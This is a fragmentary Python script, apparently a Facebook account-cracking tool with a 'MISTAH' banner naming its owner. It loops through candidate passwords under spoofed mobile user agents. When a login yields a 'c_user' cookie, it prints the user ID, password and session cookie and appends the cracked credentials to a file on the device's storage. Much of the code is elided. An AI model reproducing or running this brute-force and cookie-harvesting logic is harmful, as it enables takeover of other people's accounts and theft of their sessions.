...
ha = current.day
today = date.today()
#MAHIN2 = "\033[1;33m➤\033[1;32m➤\x1b[0m"
...
#agen2 = ['NokiaC3-00/5.0 (08.65) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+']
...
try:
    ...
    print('\x1b[1;92m[<\>]\x1b[1;97m \x1b[1;96mMAHIN')
...
for x in range(10):
    ...
    l='Mobile WVGA SMM-MAHIN/1.2.0 OPN-B'
...
\033[1;92m/_/  /_/ /_/  |_|/_/ /_/ /___/ /_/ |_/   
 \033[1;92m╔=================================╗
 |\033[1;97m[\033[1;92m❯\033[1;97m]OWNER     \033[1;31m:  \033[1;97mMISTAH \033[1;92m           | 
 |\033[1;97m[\033[1;92m❯\033[1;97m]FACEBOOK  \033[1;31m:  \033[1;97mMAHIN HASAN \033[1;92m     |   
 |\033[1;97m[\033[1;92m❯\033[1;97m]\033[97;1mTOOLS     \033[1;31m:  \033[1;34mRANDOM\033[1;92m/\033[38;5;208mV1.0      \033[38;5;46m|
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[151:166]
                #os.system("play-audio MISTAH_OK.mp3")
                print('\033[1;92m[MISTAH-OK] '+uid+' | '+ps+'\033[0;97m')
                #print(f'{B}[NUMBER📳] {K}'+uid+'  ')
                print(f'{B}[COOKIE💉] {H}'+coki)
                cek_apk(session,coki)
                open('/sdcard/MISTAH-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
                break
            else:
                continue
        loop+=1
        animasi = random.choice(["\x1b[1;91mMISTAH","\x1b[1;92mMISTAH","\x1b[1;93mMISTAH","\x1b[1;94mMISTAH","\x1b[1;95mMISTAH","\x1b[1;96mMISTAH","\x1b[1;97mMISTAH","\x1b[1;91mMISTAH","\x1b[1;92mMISTAH","\x1b[1;93mMISTAH","\x1b[1;94mMISTAH","\x1b[1;95mMISTAH","\x1b[1;96mMISTAH"])
